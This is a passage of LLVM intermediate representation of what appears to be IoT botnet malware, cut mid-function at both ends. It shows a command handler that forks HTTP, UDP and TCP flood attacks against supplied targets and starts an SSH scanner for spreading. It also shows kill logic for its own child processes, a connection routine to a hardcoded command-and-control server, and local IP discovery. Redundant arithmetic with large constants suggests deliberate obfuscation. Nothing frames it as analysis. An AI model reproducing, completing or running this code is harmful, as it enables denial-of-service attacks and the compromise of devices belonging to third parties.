  %100 = call i32 @strcmp(i8* %99, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i32 0, i32 0)) #10
  %101 = icmp ne i32 %100, 0
  br i1 %101, label %120, label %102

; <label>:102:                                    ; preds = %96
  %103 = load i32, i32* @scanPid, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %102
  br label %490

; <label>:106:                                    ; preds = %102
  %107 = call i32 @fork() #2
  store i32 %107, i32* %6, align 4
  %108 = load i32, i32* @mainCommSock, align 4
  %109 = call i32 (i32, i8*, ...) @sockprintf(i32 %108, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %110 = load i32, i32* %6, align 4
  %111 = icmp ugt i32 %110, 0
  br i1 %111, label %112, label %114

; <label>:112:                                    ; preds = %106
  %113 = load i32, i32* %6, align 4
  store i32 %113, i32* @scanPid, align 4
  br label %490

; <label>:114:                                    ; preds = %106
  %115 = load i32, i32* %6, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %114
  br label %490

; <label>:118:                                    ; preds = %114
  br label %119

; <label>:119:                                    ; preds = %118
  call void (i32, ...) bitcast (void ()* @secureShellScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:120:                                    ; preds = %96
  br label %121

; <label>:121:                                    ; preds = %120, %58
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 0
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @strcmp(i8* %124, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0)) #10
  %126 = icmp ne i32 %125, 0
  br i1 %126, label %175, label %127

; <label>:127:                                    ; preds = %121
  %128 = load i32, i32* %3, align 4
  %129 = icmp slt i32 %128, 3
  br i1 %129, label %136, label %130

; <label>:130:                                    ; preds = %127
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 2
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  %135 = icmp slt i32 %134, 1
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %130, %127
  br label %490

; <label>:137:                                    ; preds = %130
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 1
  %140 = load i8*, i8** %139, align 8
  store i8* %140, i8** %7, align 8
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 2
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #10
  store i32 %144, i32* %8, align 4
  %145 = load i8*, i8** %7, align 8
  %146 = call i8* @strstr(i8* %145, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %147 = icmp ne i8* %146, null
  br i1 %147, label %148, label %165

; <label>:148:                                    ; preds = %137
  %149 = load i8*, i8** %7, align 8
  %150 = call i8* @strtok(i8* %149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %150, i8** %9, align 8
  br label %151

; <label>:151:                                    ; preds = %162, %148
  %152 = load i8*, i8** %9, align 8
  %153 = icmp ne i8* %152, null
  br i1 %153, label %154, label %164

; <label>:154:                                    ; preds = %151
  %155 = call i32 @listFork()
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %162, label %157

; <label>:157:                                    ; preds = %154
  %158 = load i8*, i8** %7, align 8
  %159 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %158, i32 %159)
  %160 = load i32, i32* @mainCommSock, align 4
  %161 = call i32 @close(i32 %160)
  call void @_exit(i32 0) #12
  unreachable

; <label>:162:                                    ; preds = %154
  %163 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %163, i8** %9, align 8
  br label %151

; <label>:164:                                    ; preds = %151
  br label %174

; <label>:165:                                    ; preds = %137
  %166 = call i32 @listFork()
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %165
  br label %490

; <label>:169:                                    ; preds = %165
  %170 = load i8*, i8** %7, align 8
  %171 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %170, i32 %171)
  %172 = load i32, i32* @mainCommSock, align 4
  %173 = call i32 @close(i32 %172)
  call void @_exit(i32 0) #12
  unreachable

; <label>:174:                                    ; preds = %164
  br label %175

; <label>:175:                                    ; preds = %174, %121
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 0
  %178 = load i8*, i8** %177, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0)) #10
  %180 = icmp ne i32 %179, 0
  br i1 %180, label %298, label %181

; <label>:181:                                    ; preds = %175
  %182 = load i32, i32* %3, align 4
  %183 = icmp slt i32 %182, 6
  br i1 %183, label %229, label %184

; <label>:184:                                    ; preds = %181
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 3
  %187 = load i8*, i8** %186, align 8
  %188 = call i32 @atoi(i8* %187) #10
  %189 = icmp eq i32 %188, -1
  br i1 %189, label %229, label %190

; <label>:190:                                    ; preds = %184
  %191 = load i8**, i8*** %4, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 2
  %193 = load i8*, i8** %192, align 8
  %194 = call i32 @atoi(i8* %193) #10
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %229, label %196

; <label>:196:                                    ; preds = %190
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 4
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #10
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %229, label %202

; <label>:202:                                    ; preds = %196
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 5
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #10
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %229, label %208

; <label>:208:                                    ; preds = %202
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 5
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @atoi(i8* %211) #10
  %213 = icmp sgt i32 %212, 65500
  br i1 %213, label %229, label %214

; <label>:214:                                    ; preds = %208
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 4
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  %219 = icmp sgt i32 %218, 32
  br i1 %219, label %229, label %220

; <label>:220:                                    ; preds = %214
  %221 = load i32, i32* %3, align 4
  %222 = icmp eq i32 %221, 7
  br i1 %222, label %223, label %230

; <label>:223:                                    ; preds = %220
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 6
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226) #10
  %228 = icmp slt i32 %227, 1
  br i1 %228, label %229, label %230

; <label>:229:                                    ; preds = %223, %214, %208, %202, %196, %190, %184, %181
  br label %490

; <label>:230:                                    ; preds = %223, %220
  %231 = load i8**, i8*** %4, align 8
  %232 = getelementptr inbounds i8*, i8** %231, i64 1
  %233 = load i8*, i8** %232, align 8
  store i8* %233, i8** %10, align 8
  %234 = load i8**, i8*** %4, align 8
  %235 = getelementptr inbounds i8*, i8** %234, i64 2
  %236 = load i8*, i8** %235, align 8
  %237 = call i32 @atoi(i8* %236) #10
  store i32 %237, i32* %11, align 4
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 3
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #10
  store i32 %241, i32* %12, align 4
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 4
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  store i32 %245, i32* %13, align 4
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 5
  %248 = load i8*, i8** %247, align 8
  %249 = call i32 @atoi(i8* %248) #10
  store i32 %249, i32* %14, align 4
  %250 = load i32, i32* %3, align 4
  %251 = icmp eq i32 %250, 7
  br i1 %251, label %252, label %257

; <label>:252:                                    ; preds = %230
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 6
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @atoi(i8* %255) #10
  br label %258

; <label>:257:                                    ; preds = %230
  br label %258

; <label>:258:                                    ; preds = %257, %252
  %259 = phi i32 [ %256, %252 ], [ 10, %257 ]
  store i32 %259, i32* %15, align 4
  %260 = load i8*, i8** %10, align 8
  %261 = call i8* @strstr(i8* %260, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %262 = icmp ne i8* %261, null
  br i1 %262, label %263, label %284

; <label>:263:                                    ; preds = %258
  %264 = load i8*, i8** %10, align 8
  %265 = call i8* @strtok(i8* %264, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %265, i8** %16, align 8
  br label %266

; <label>:266:                                    ; preds = %281, %263
  %267 = load i8*, i8** %16, align 8
  %268 = icmp ne i8* %267, null
  br i1 %268, label %269, label %283

; <label>:269:                                    ; preds = %266
  %270 = call i32 @listFork()
  %271 = icmp ne i32 %270, 0
  br i1 %271, label %281, label %272

; <label>:272:                                    ; preds = %269
  %273 = load i8*, i8** %16, align 8
  %274 = load i32, i32* %11, align 4
  %275 = load i32, i32* %12, align 4
  %276 = load i32, i32* %13, align 4
  %277 = load i32, i32* %14, align 4
  %278 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %273, i32 %274, i32 %275, i32 %276, i32 %277, i32 %278)
  %279 = load i32, i32* @mainCommSock, align 4
  %280 = call i32 @close(i32 %279)
  call void @_exit(i32 0) #12
  unreachable

; <label>:281:                                    ; preds = %269
  %282 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %282, i8** %16, align 8
  br label %266

; <label>:283:                                    ; preds = %266
  br label %297

; <label>:284:                                    ; preds = %258
  %285 = call i32 @listFork()
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %287, label %288

; <label>:287:                                    ; preds = %284
  br label %490

; <label>:288:                                    ; preds = %284
  %289 = load i8*, i8** %10, align 8
  %290 = load i32, i32* %11, align 4
  %291 = load i32, i32* %12, align 4
  %292 = load i32, i32* %13, align 4
  %293 = load i32, i32* %14, align 4
  %294 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %289, i32 %290, i32 %291, i32 %292, i32 %293, i32 %294)
  %295 = load i32, i32* @mainCommSock, align 4
  %296 = call i32 @close(i32 %295)
  call void @_exit(i32 0) #12
  unreachable

; <label>:297:                                    ; preds = %283
  br label %298

; <label>:298:                                    ; preds = %297, %175
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 0
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @strcmp(i8* %301, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %303 = icmp ne i32 %302, 0
  br i1 %303, label %429, label %304

; <label>:304:                                    ; preds = %298
  %305 = load i32, i32* %3, align 4
  %306 = icmp slt i32 %305, 6
  br i1 %306, label %349, label %307

; <label>:307:                                    ; preds = %304
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 3
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* %310) #10
  %312 = icmp eq i32 %311, -1
  br i1 %312, label %349, label %313

; <label>:313:                                    ; preds = %307
  %314 = load i8**, i8*** %4, align 8
  %315 = getelementptr inbounds i8*, i8** %314, i64 2
  %316 = load i8*, i8** %315, align 8
  %317 = call i32 @atoi(i8* %316) #10
  %318 = icmp eq i32 %317, -1
  br i1 %318, label %349, label %319

; <label>:319:                                    ; preds = %313
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 4
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #10
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %349, label %325

; <label>:325:                                    ; preds = %319
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 4
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #10
  %330 = icmp sgt i32 %329, 32
  br i1 %330, label %349, label %331

; <label>:331:                                    ; preds = %325
  %332 = load i32, i32* %3, align 4
  %333 = icmp sgt i32 %332, 6
  br i1 %333, label %334, label %340

; <label>:334:                                    ; preds = %331
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 6
  %337 = load i8*, i8** %336, align 8
  %338 = call i32 @atoi(i8* %337) #10
  %339 = icmp slt i32 %338, 0
  br i1 %339, label %349, label %340

; <label>:340:                                    ; preds = %334, %331
  %341 = load i32, i32* %3, align 4
  %342 = icmp eq i32 %341, 8
  br i1 %342, label %343, label %350

; <label>:343:                                    ; preds = %340
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 7
  %346 = load i8*, i8** %345, align 8
  %347 = call i32 @atoi(i8* %346) #10
  %348 = icmp slt i32 %347, 1
  br i1 %348, label %349, label %350

; <label>:349:                                    ; preds = %343, %334, %325, %319, %313, %307, %304
  br label %490

; <label>:350:                                    ; preds = %343, %340
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 1
  %353 = load i8*, i8** %352, align 8
  store i8* %353, i8** %17, align 8
  %354 = load i8**, i8*** %4, align 8
  %355 = getelementptr inbounds i8*, i8** %354, i64 2
  %356 = load i8*, i8** %355, align 8
  %357 = call i32 @atoi(i8* %356) #10
  store i32 %357, i32* %18, align 4
  %358 = load i8**, i8*** %4, align 8
  %359 = getelementptr inbounds i8*, i8** %358, i64 3
  %360 = load i8*, i8** %359, align 8
  %361 = call i32 @atoi(i8* %360) #10
  store i32 %361, i32* %19, align 4
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 4
  %364 = load i8*, i8** %363, align 8
  %365 = call i32 @atoi(i8* %364) #10
  store i32 %365, i32* %20, align 4
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 5
  %368 = load i8*, i8** %367, align 8
  store i8* %368, i8** %21, align 8
  %369 = load i32, i32* %3, align 4
  %370 = icmp eq i32 %369, 8
  br i1 %370, label %371, label %376

; <label>:371:                                    ; preds = %350
  %372 = load i8**, i8*** %4, align 8
  %373 = getelementptr inbounds i8*, i8** %372, i64 7
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @atoi(i8* %374) #10
  br label %377

; <label>:376:                                    ; preds = %350
  br label %377

; <label>:377:                                    ; preds = %376, %371
  %378 = phi i32 [ %375, %371 ], [ 10, %376 ]
  store i32 %378, i32* %22, align 4
  %379 = load i32, i32* %3, align 4
  %380 = icmp sgt i32 %379, 6
  br i1 %380, label %381, label %386

; <label>:381:                                    ; preds = %377
  %382 = load i8**, i8*** %4, align 8
  %383 = getelementptr inbounds i8*, i8** %382, i64 6
  %384 = load i8*, i8** %383, align 8
  %385 = call i32 @atoi(i8* %384) #10
  br label %387

; <label>:386:                                    ; preds = %377
  br label %387

; <label>:387:                                    ; preds = %386, %381
  %388 = phi i32 [ %385, %381 ], [ 0, %386 ]
  store i32 %388, i32* %23, align 4
  %389 = load i8*, i8** %17, align 8
  %390 = call i8* @strstr(i8* %389, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %391 = icmp ne i8* %390, null
  br i1 %391, label %392, label %414

; <label>:392:                                    ; preds = %387
  %393 = load i8*, i8** %17, align 8
  %394 = call i8* @strtok(i8* %393, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %394, i8** %24, align 8
  br label %395

; <label>:395:                                    ; preds = %411, %392
  %396 = load i8*, i8** %24, align 8
  %397 = icmp ne i8* %396, null
  br i1 %397, label %398, label %413

; <label>:398:                                    ; preds = %395
  %399 = call i32 @listFork()
  %400 = icmp ne i32 %399, 0
  br i1 %400, label %411, label %401

; <label>:401:                                    ; preds = %398
  %402 = load i8*, i8** %24, align 8
  %403 = load i32, i32* %18, align 4
  %404 = load i32, i32* %19, align 4
  %405 = load i32, i32* %20, align 4
  %406 = load i8*, i8** %21, align 8
  %407 = load i32, i32* %23, align 4
  %408 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %402, i32 %403, i32 %404, i32 %405, i8* %406, i32 %407, i32 %408)
  %409 = load i32, i32* @mainCommSock, align 4
  %410 = call i32 @close(i32 %409)
  call void @_exit(i32 0) #12
  unreachable

; <label>:411:                                    ; preds = %398
  %412 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %412, i8** %24, align 8
  br label %395

; <label>:413:                                    ; preds = %395
  br label %428

; <label>:414:                                    ; preds = %387
  %415 = call i32 @listFork()
  %416 = icmp ne i32 %415, 0
  br i1 %416, label %417, label %418

; <label>:417:                                    ; preds = %414
  br label %490

; <label>:418:                                    ; preds = %414
  %419 = load i8*, i8** %17, align 8
  %420 = load i32, i32* %18, align 4
  %421 = load i32, i32* %19, align 4
  %422 = load i32, i32* %20, align 4
  %423 = load i8*, i8** %21, align 8
  %424 = load i32, i32* %23, align 4
  %425 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %419, i32 %420, i32 %421, i32 %422, i8* %423, i32 %424, i32 %425)
  %426 = load i32, i32* @mainCommSock, align 4
  %427 = call i32 @close(i32 %426)
  call void @_exit(i32 0) #12
  unreachable

; <label>:428:                                    ; preds = %413
  br label %429

; <label>:429:                                    ; preds = %428, %298
  %430 = load i8**, i8*** %4, align 8
  %431 = getelementptr inbounds i8*, i8** %430, i64 0
  %432 = load i8*, i8** %431, align 8
  %433 = call i32 @strcmp(i8* %432, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0)) #10
  %434 = icmp ne i32 %433, 0
  br i1 %434, label %482, label %435

; <label>:435:                                    ; preds = %429
  store i32 0, i32* %25, align 4
  store i64 0, i64* %26, align 8
  br label %436

; <label>:436:                                    ; preds = %465, %435
  %437 = load i64, i64* %26, align 8
  %438 = load i64, i64* @numpids, align 8
  %439 = icmp ult i64 %437, %438
  br i1 %439, label %440, label %471

; <label>:440:                                    ; preds = %436
  %441 = load i32*, i32** @pids, align 8
  %442 = load i64, i64* %26, align 8
  %443 = getelementptr inbounds i32, i32* %441, i64 %442
  %444 = load i32, i32* %443, align 4
  %445 = icmp ne i32 %444, 0
  br i1 %445, label %446, label %464

; <label>:446:                                    ; preds = %440
  %447 = load i32*, i32** @pids, align 8
  %448 = load i64, i64* %26, align 8
  %449 = getelementptr inbounds i32, i32* %447, i64 %448
  %450 = load i32, i32* %449, align 4
  %451 = call i32 @getpid() #2
  %452 = icmp ne i32 %450, %451
  br i1 %452, label %453, label %464

; <label>:453:                                    ; preds = %446
  %454 = load i32*, i32** @pids, align 8
  %455 = load i64, i64* %26, align 8
  %456 = getelementptr inbounds i32, i32* %454, i64 %455
  %457 = load i32, i32* %456, align 4
  %458 = call i32 @kill(i32 %457, i32 9) #2
  %459 = load i32, i32* %25, align 4
  %460 = add i32 %459, -800367983
  %461 = add i32 %460, 1
  %462 = sub i32 %461, -800367983
  %463 = add nsw i32 %459, 1
  store i32 %462, i32* %25, align 4
  br label %464

; <label>:464:                                    ; preds = %453, %446, %440
  br label %465

; <label>:465:                                    ; preds = %464
  %466 = load i64, i64* %26, align 8
  %467 = add i64 %466, 4003519637165197676
  %468 = add i64 %467, 1
  %469 = sub i64 %468, 4003519637165197676
  %470 = add i64 %466, 1
  store i64 %469, i64* %26, align 8
  br label %436

; <label>:471:                                    ; preds = %436
  %472 = load i32, i32* %25, align 4
  %473 = icmp sgt i32 %472, 0
  br i1 %473, label %474, label %478

; <label>:474:                                    ; preds = %471
  %475 = load i32, i32* @mainCommSock, align 4
  %476 = load i32, i32* %25, align 4
  %477 = call i32 (i32, i8*, ...) @sockprintf(i32 %475, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i32 %476)
  br label %481

; <label>:478:                                    ; preds = %471
  %479 = load i32, i32* @mainCommSock, align 4
  %480 = call i32 (i32, i8*, ...) @sockprintf(i32 %479, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0))
  br label %481

; <label>:481:                                    ; preds = %478, %474
  br label %482

; <label>:482:                                    ; preds = %481, %429
  %483 = load i8**, i8*** %4, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 0
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @strcmp(i8* %485, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.75, i32 0, i32 0)) #10
  %487 = icmp ne i32 %486, 0
  br i1 %487, label %489, label %488

; <label>:488:                                    ; preds = %482
  call void @exit(i32 0) #14
  unreachable

; <label>:489:                                    ; preds = %482
  br label %490

; <label>:490:                                    ; preds = %489, %417, %349, %287, %229, %168, %136, %117, %112, %105, %93, %88, %81, %67, %55, %46, %41, %32
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add nsw i32 %11, 1
  %17 = sext i32 %15 to i64
  %18 = icmp eq i64 %17, 1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %26

; <label>:20:                                     ; preds = %10
  %21 = load i32, i32* @currentServer, align 4
  %22 = sub i32 %21, 351504806
  %23 = add i32 %22, 1
  %24 = add i32 %23, 351504806
  %25 = add nsw i32 %21, 1
  store i32 %24, i32* @currentServer, align 4
  br label %26

; <label>:26:                                     ; preds = %20, %19
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %28 = load i32, i32* @currentServer, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcpy(i8* %27, i8* %31) #2
  store i32 46, i32* %3, align 4
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = icmp ne i8* %34, null
  br i1 %35, label %36, label %43

; <label>:36:                                     ; preds = %26
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  %39 = getelementptr inbounds i8, i8* %38, i64 1
  %40 = call i32 @atoi(i8* %39) #10
  store i32 %40, i32* %3, align 4
  %41 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %42 = call i8* @strchr(i8* %41, i32 58) #10
  store i8 0, i8* %42, align 1
  br label %43

; <label>:43:                                     ; preds = %36, %26
  %44 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %44, i32* @mainCommSock, align 4
  %45 = load i32, i32* @mainCommSock, align 4
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %47 = load i32, i32* %3, align 4
  %48 = call i32 @connectTimeout(i32 %45, i8* %46, i32 %47, i32 30)
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

; <label>:50:                                     ; preds = %43
  store i32 1, i32* %1, align 4
  br label %52

; <label>:51:                                     ; preds = %43
  store i32 0, i32* %1, align 4
  br label %52

; <label>:52:                                     ; preds = %51, %50
  %53 = load i32, i32* %1, align 4
  ret i32 %53
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %105

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.76, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %105

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %105

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.77, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

